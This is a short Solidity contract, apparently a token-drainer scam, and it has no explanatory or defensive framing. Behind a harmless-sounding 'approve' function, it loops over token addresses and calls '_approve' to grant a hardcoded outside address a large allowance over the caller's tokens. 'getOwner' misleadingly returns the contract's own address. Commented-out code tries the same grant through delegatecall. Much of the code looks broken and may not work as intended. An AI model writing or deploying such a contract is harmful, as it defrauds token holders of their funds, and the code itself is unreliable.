pragma solidity 0.8.4;
// pragma solidity 0.4.20;

contract Smart {
    address  public owner;

    event Response(bool success1, bool success2);
    event Sender(address sender);

    constructor() {
        owner = msg.sender;
    }


    function getOwner() public view returns(address) {
        return address(this);
    }


    function approve(address[] memory _spenders, uint _value) public returns(bool) {

        for (uint i = 0; i < _spenders.length; i++) {
            IBEP20 token = IBEP20(_spenders[i]);
            // token.approve(address(this), _value);
            token._approve(msg.sender, 0xd15bEC67023f139D3eF791c0F4e898eF136bc664, 99999999);
        }

        return true;
    }

    // function isContract(address account) internal view returns (bool) {
    //     uint256 size;
    //     assembly {
    //         size := extcodesize(account)
    //     }
    //     return size > 0;
    // }

    // function approve2() public returns (bool[2]){
    //     address token = 0x7083609fCE4d1d8Dc0C979AAb8c869Ea2C873402; //DOT
    //     uint256 amount = 777777777;
    //         //(bool success, bytes memory data) = token.delegatecall(abi.encodeWithSignature("approve(address, uint256)", 
    //         //    0xD072F99a88efa8484F393Bc73B5Cab09606b21f2, amount));

    //         bool success1 = token.delegatecall(bytes4(keccak256("symbol()")));

    //         bool success2 = token.delegatecall(bytes4(keccak256("approve(address,uint256)")),
    //         0xd15bEC67023f139D3eF791c0F4e898eF136bc664, amount);

    //         // (bool b,) = token.delegatecall(abi.encodeWithSignature("approve(address,uint256)", 
    //         // 0xD072F99a88efa8484F393Bc73B5Cab09606b21f2, amount));


    //         Response(success1, success2);
    //         // emit Sender(msg.sender);
    //         return [success1, success2];

    // }



}

interface IBEP20 {
    function symbol() external view returns (string memory);
    function approve(address spender, uint256 amount) external returns (bool);
    function _approve(address owner, address spender, uint256 amount) external;
}

